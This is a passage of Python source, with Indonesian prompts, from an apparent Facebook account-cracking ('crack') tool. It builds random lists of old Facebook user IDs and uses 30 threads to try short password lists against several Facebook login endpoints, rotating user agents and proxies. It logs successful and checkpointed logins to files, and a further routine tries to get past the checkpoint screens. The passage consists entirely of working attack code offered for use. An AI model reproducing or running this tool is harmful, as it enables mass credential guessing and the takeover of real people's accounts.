			heade={'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://IPhone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://IPhone.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_mobile(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.mobile, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def mobile(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_touch(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def touch(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_free(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def free(self, uid, pwx):
		nip=random.choice(prox)
		rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_basic(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def basic(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				print(" %s[%s√%s] %sSukses Disimpan Di File ─>%s CloningMat-Data/Ok/%\n"%(P,H,P,O,H,okez2009_10))
				self.ok.append("%s|%s"%(uid, pw))
				open('/sdcard/CloningMat-Data/Ok/'+cepez2009_10,'a').write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				print(" %s[%s√%s] %sSukses Disimpan Di File ─>%s CloningMat-Data/Cp/%\n"%(P,H,P,O,K,cepez2009_10))
				self.cp.append("%s|%s"%(uid, pw))
				open('/sdcard/CloningMat-Data/Cp/'+cepez2009_10,'a').write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
		
	def old_bapi(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def bapi(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r┌%s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r└%s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				print(" └%s[%s√%s] %sSukses Disimpan Di File ─> %s%\n"%(P,H,P,O,H,okez2009_10))
				self.ok.append("%s|%s"%(uid, pw))
				open(+okez2009_10,'a').write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r└%s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				print(" └%s[%s√%s] %sSukses Disimpan Di File ─> %s%s %\n"%(P,H,P,O,K,cepez2009_10))
				self.cp.append("%s|%s"%(uid, pw))
				open(+cepez2009_10,'a').write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
		
		
	def kk(self):
		c = len(self.cp)
		print('\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Terdapat %s%s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(H,c)) 
		input('\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Mulai')
		print('\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Proses Check Dimulai')
		self.love = 0
		for kes in self.cp:
			try:
				try:
					id,pw = kes.split('|')[0],kes.split('|')[1]
				except IndexError:
					time.sleep(2)
					print('\r%s • %s • Error      %s'%(H,kes,H))
					print('\r\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Pemisah Tidak Didukung Untuk Program Ini%s')
					continue
				bi = random.choice([P,K,H,J,B,O])
				print('\r %s%s/%s %s %s'%(bi,self.love,len(self.cp),id,P), end=' ');sys.stdout.flush()
				ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
				ses = requests.Session()
				header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
				hi = ses.get('https://mbasic.facebook.com')
				ho = parsel(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
				if "checkpoint" in ses.cookies.get_dict().keys():
					try:
						jo = ho.find('form')
						data = {}
						lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
						for anj in jo('input'):
							if anj.get('name') in lion:
								data.update({anj.get('name'):anj.get('value')})
						kent = parsel(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
						print('\r%s{CP}  %s • %s'%(K,id,pw))
						opsi = kent.find_all('option')
						if len(opsi)==0:
							print('\r%s • Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(P,H))
						else:
							for opsii in opsi:
								print('\r%s • %s%s'%(H,opsii.text,P))
					except:
						print('\r%s{CP} %s • %s'%(k,id,pw))
						print('\r\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Tidak Dapat Mengecek Opsi')
				elif "c_user" in ses.cookies.get_dict().keys():
					print('\r%s[OK] %s • %s'%(H,id,pw))
				else:
					print('\r%s%s • %s'%(M,id,pw))
					self.love+=1
			except requests.exceptions.ConnectionError:
				print('')
				print('\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Koneksi Internet Bermasalah')
				exit()
		print('\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Beres')
		input('\x1b[38;5;231m{\x1b[38;5;46m•\x1b[38;5;196m•\x1b[38;5;231m} Kembali')
		Main()
	def ceks(self):
		#c = len(self.cp)
		a = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
		mb = "https://mbasic.facebook.com"
		ses = requests.Session()
		ses.headers.update({
		"Host": "mbasic.facebook.com",
		"cache-control": "max-age=0",
		"sec-ch-ua": '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"', 
		"sec-ch-ua-mobile": "?1", 
		"sec-ch-ua-platform": '"Android"', 
		"upgrade-insecure-requests": "1",
		"origin": mb,
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": ua,
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with": "mark.via.gp",
		"sec-fetch-site": "none",
		"sec-fetch-mode": "navigate",
		"sec-fetch-user": "?1",
		"sec-fetch-dest": "document",
		"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
		})
		data = {}
